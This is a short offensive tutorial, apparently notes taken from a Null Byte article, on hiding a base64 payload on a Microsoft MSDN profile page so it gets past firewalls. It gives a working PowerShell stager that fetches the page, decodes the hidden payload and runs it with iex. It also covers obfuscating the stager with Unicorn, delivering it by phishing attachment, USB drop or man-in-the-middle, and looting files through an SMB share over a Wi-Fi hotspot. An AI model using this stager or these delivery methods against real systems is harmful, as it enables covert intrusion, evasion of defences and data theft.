## Use Microsoft.com Domains to Bypass Firewalls & Execute Payloads

### Create the Payload

`powershell -ep bypass /w 1 /C New-Item -ItemType file 'C:\Users\\\$env:USERNAME\Documents\pwn_sauce'`

`printf '%s' "PAYLOAD GOES HERE" | base64 | tr -d '\n'` [^1]

### Host the Payload on the Microsoft Website

### Create the Stager

`$wro = iwr -Uri https://social.msdn.microsoft.com/Profile/USERNAME -UseBasicParsing;$r = [Regex]::new("(?<=START)(.*)(?=END)");$m = $r.Match($wro.rawcontent);if($m.Success){ $p = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($m.value));iex $p }`[^2]

### Obfuscate the PowerShell Stager (Optional)

`python unicorn.py stager.ps1` [^3]

`cat powershell_attack.txt`

### Deploy the Stager

- Man-in-the-middle
- Email Attachment
- USB Dead Drop
- USB Rubber Ducky
- …

### Improve the Attack (Conclusion) [^4]

[原文](https://null-byte.wonderhowto.com/how-to/use-microsoft-com-domains-bypass-firewalls-execute-payloads-0196505/)

---

[^1]: ``cG93ZXJzaGVsbCAtZXAgYnlwYXNzIC93IDEgL0MgTmV3LUl0ZW0gLUl0ZW1UeXBlIGZpbGUgJ0M6XFVzZXJzXCRlbnY6VVNFUk5BTUVcRG9jdW1lbnRzXHB3bl9zYXVjZSc=``
[^2]: PowerShell单线程设计用于下载Microsoft用户的配置文件页面，提取编码的有效负载，对其进行解码，然后执行
[^3]: 使用 [Unicorn](https://github.com/trustedsec/unicorn) 这个工具来混淆 stager
[^4]: 通常情况下我们放置通用的TCP反向shell，但这很容易检测到 - 这会破坏在stager中使用Microsoft或Google域的目的。因此将目标计算机用作Wi-Fi热点并[创建SMB共享](https://docs.microsoft.com/en-us/powershell/module/smbshare/new-smbshare?view=win10-ps)以允许入侵者连接到目标的Wi-Fi热点（绕过原始网络）并掠夺计算机上的文件